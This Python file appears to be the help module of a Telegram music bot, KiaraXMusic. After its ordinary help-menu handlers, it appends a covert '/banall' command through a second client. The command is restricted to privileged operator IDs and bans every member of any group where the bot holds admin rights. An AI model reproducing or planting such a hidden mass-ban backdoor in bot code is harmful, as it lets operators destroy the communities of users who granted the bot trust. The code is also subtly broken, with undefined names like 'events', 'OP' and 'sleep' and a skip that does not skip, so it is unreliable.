from typing import Union
from KiaraXMusic import sree

from pyrogram import filters, types
from pyrogram.types import InlineKeyboardMarkup, Message

from telethon.tl.functions.channels import EditBannedRequest, DeleteMessagesRequest
from telethon.tl.types import ChatBannedRights
from telethon.errors import rpcerrorlist

from KiaraXMusic import app
from KiaraXMusic.utils import help_pannel
from KiaraXMusic.utils.database import get_lang
from KiaraXMusic.utils.decorators.language import LanguageStart, languageCB
from KiaraXMusic.utils.inline.help import help_back_markup, private_help_panel
from config import BANNED_USERS, START_IMG_URL, SUPPORT_CHAT
from strings import get_string, helpers


@app.on_message(filters.command(["help"]) & filters.private & ~BANNED_USERS)
@app.on_callback_query(filters.regex("settings_back_helper") & ~BANNED_USERS)
async def helper_private(
    client: app, update: Union[types.Message, types.CallbackQuery]
):
    is_callback = isinstance(update, types.CallbackQuery)
    if is_callback:
        try:
            await update.answer()
        except:
            pass
        chat_id = update.message.chat.id
        language = await get_lang(chat_id)
        _ = get_string(language)
        keyboard = help_pannel(_, True)
        await update.edit_message_text(
            _["help_1"].format(SUPPORT_CHAT), reply_markup=keyboard
        )
    else:
        try:
            await update.delete()
        except:
            pass
        language = await get_lang(update.chat.id)
        _ = get_string(language)
        keyboard = help_pannel(_)
        await update.reply_photo(
            photo=START_IMG_URL,
            caption=_["help_1"].format(SUPPORT_CHAT),
            reply_markup=keyboard,
        )


@app.on_message(filters.command(["help"]) & filters.group & ~BANNED_USERS)
@LanguageStart
async def help_com_group(client, message: Message, _):
    keyboard = private_help_panel(_)
    await message.reply_text(_["help_2"], reply_markup=InlineKeyboardMarkup(keyboard))


@app.on_callback_query(filters.regex("help_callback") & ~BANNED_USERS)
@languageCB
async def helper_cb(client, CallbackQuery, _):
    callback_data = CallbackQuery.data.strip()
    cb = callback_data.split(None, 1)[1]
    keyboard = help_back_markup(_)
    if cb == "hb1":
        await CallbackQuery.edit_message_text(helpers.HELP_1, reply_markup=keyboard)
    elif cb == "hb2":
        await CallbackQuery.edit_message_text(helpers.HELP_2, reply_markup=keyboard)
    elif cb == "hb3":
        await CallbackQuery.edit_message_text(helpers.HELP_3, reply_markup=keyboard)
    elif cb == "hb4":
        await CallbackQuery.edit_message_text(helpers.HELP_4, reply_markup=keyboard)
    elif cb == "hb5":
        await CallbackQuery.edit_message_text(helpers.HELP_5, reply_markup=keyboard)
    elif cb == "hb6":
        await CallbackQuery.edit_message_text(helpers.HELP_6, reply_markup=keyboard)
    elif cb == "hb7":
        await CallbackQuery.edit_message_text(helpers.HELP_7, reply_markup=keyboard)
    elif cb == "hb8":
        await CallbackQuery.edit_message_text(helpers.HELP_8, reply_markup=keyboard)
    elif cb == "hb9":
        await CallbackQuery.edit_message_text(helpers.HELP_9, reply_markup=keyboard)
    elif cb == "hb10":
        await CallbackQuery.edit_message_text(helpers.HELP_10, reply_markup=keyboard)
    elif cb == "hb11":
        await CallbackQuery.edit_message_text(helpers.HELP_11, reply_markup=keyboard)
    elif cb == "hb12":
        await CallbackQuery.edit_message_text(helpers.HELP_12, reply_markup=keyboard)
    elif cb == "hb13":
        await CallbackQuery.edit_message_text(helpers.HELP_13, reply_markup=keyboard)
    elif cb == "hb14":
        await CallbackQuery.edit_message_text(helpers.HELP_14, reply_markup=keyboard)
    elif cb == "hb15":
        await CallbackQuery.edit_message_text(helpers.HELP_15, reply_markup=keyboard)

@sree.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
    if event.sender_id in OP:  # Use sender_id instead of sender.id
        if not event.is_group:
            Rep = f"__Use This Command In Any Group!__"
            await event.reply(Rep)
        else:
            await event.delete()
            cht = await event.get_chat()
            boss = await event.client.get_me()
            admin = cht.admin_rights
            creator = cht.creator
            if not admin and not creator:
                await event.reply("__I Don't Have Sufficient Rights To Do This.__")
                return
            hmm = await event.reply("__Searching Group Members...__")
            await sleep(18)
            await hmm.delete()
            everyone = await event.client.get_participants(event.chat_id)
            for user in everyone:
                if user.id == boss.id:
                    pass
                try:
                    await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
                except rpcerrorlist.ParticipantIdInvalidError as e_participant:
                    print(f"Error banning user {user.id}: {e_participant}")
                    continue  # Skip to the next user
                except Exception as e:
                    print(f"Error banning user {user.id}: {e}")
                    await sleep(0.3)
                    continue
                try:
                    await event.client(DeleteMessagesRequest(event.chat_id, [event.id, event.id + 1]))
                    await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
                except rpcerrorlist.MessageIdInvalidError as e_message:
                    print(f"Error editing message: {e_message}")
                except Exception as e:
                    print(f"Error editing message: {e}")
                await sleep(0.3)
